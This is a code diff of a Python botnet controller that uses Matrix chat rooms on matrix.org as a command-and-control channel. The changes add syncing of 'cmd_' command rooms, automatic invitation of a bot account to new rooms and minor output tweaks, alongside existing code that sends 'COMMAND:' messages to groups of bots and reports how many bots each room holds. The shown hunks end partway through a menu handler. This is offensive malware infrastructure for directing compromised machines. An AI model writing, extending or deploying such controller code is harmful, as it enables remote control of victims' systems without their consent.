@@ -13,6 +13,7 @@ from dataclasses import dataclass
 load_dotenv()
 USER_NAME = os.getenv('CONTROLLER_NAME')  
 PASSWORD = os.getenv('CONTROLLER_PASSWORD')
+BOTS_NAME = os.getenv('BOT_NAME')
 ANNOUNCE_ROOM_ID = os.getenv('ANNOUNCE_ROOM_ID')
 MATRIX_HOMESERVER = "https://matrix.org"
 
@@ -90,10 +91,13 @@ class BotnetController:
             room = self.client.join_room(roomid)
         return room
             
-    def join_rooms(self):
-        self.announce_room = self.join_room(ANNOUNCE_ROOM_ID)
-        for cmdroom in [COMMAND_ROOM_ID]:
-            self.command_rooms[cmdroom] = CommandRoom(self.join_room(cmdroom))
+    def sync_rooms(self):
+        joined_rooms: dict[str, Room] = self.client.get_rooms()
+        for id, room in joined_rooms.items():
+            if room.name.startswith("cmd_"):
+                self.command_rooms[id] = CommandRoom(room)
+            elif room.name == "announcements":
+                self.announce_room = self.join_room(ANNOUNCE_ROOM_ID)
 
     def send_command(self, command, room):
         response = room.send_cmd(f"COMMAND:{command}")
@@ -123,14 +127,13 @@ class BotnetController:
         self.assign_bot(msgbody, room_id)
             
     def create_room(self, name: str) -> Room:
-        room: Room = self.client.create_room(name, is_public=False)
-        room.name = name
+        room: Room = self.client.create_room(name, is_public=False, invitees=[BOTS_NAME])
+        room.set_room_name(name)
         return room
     
     def add_command_room(self, name: str):
-        new_room = self.create_room(name)
+        new_room = self.create_room(f"cmd_{name}")
         self.command_rooms[new_room.room_id] = CommandRoom(new_room)
-            
 
     def command_option(self):
         command = input("Command: ")
@@ -141,7 +144,7 @@ class BotnetController:
         room_list = list(self.command_rooms.items())
         print("To which room would you like to send a command?")
         for idx, (_, room) in enumerate(room_list):
-            print(f"# {idx} | {room.room.name}: {len(room.bots)} bots")
+            print(f"#{idx} | {room.room.name}: {len(room.bots)} bots")
         room_nr = int(input("Choose room number: "))
         if room_nr >= len(room_list):
             print("realy??")
@@ -164,10 +167,11 @@ class BotnetController:
         room_name = input("Room name: ")
         room_name = room_name.replace(" ", "_")
         self.add_command_room(room_name)
+        print("[+] room created successfully")
 
     def run(self):
         self.login()
-        self.join_rooms()
+        self.sync_rooms()
         
         self.announce_room.add_listener(self.on_message)
         self.client.start_listener_thread()
@@ -178,7 +182,7 @@ class BotnetController:
             print("#1 Send Command")
             print("#2 Show botnet state")
             print("#3 Create Room")
-            option = int(input("What would you like to do?"))
+            option = int(input("What would you like to do? "))
             print()
             match option:
                 case 1:
